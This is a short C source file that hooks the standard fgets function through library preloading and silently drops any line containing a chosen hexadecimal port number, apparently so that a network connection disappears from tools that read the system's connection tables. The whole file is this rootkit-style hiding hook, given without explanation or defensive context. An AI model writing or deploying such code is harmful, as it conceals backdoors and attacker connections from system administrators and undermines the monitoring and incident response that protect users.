#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

char *fgets(char *s, int size, FILE *stream) {
    static char* (*orig)(char*, int, FILE*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fgets");

    char *ret = orig(s, size, stream);
    if (ret && strstr(s, ":" PORT_TO_HIDE_HEX " ")) return fgets(s, size, stream);
    return ret;
}


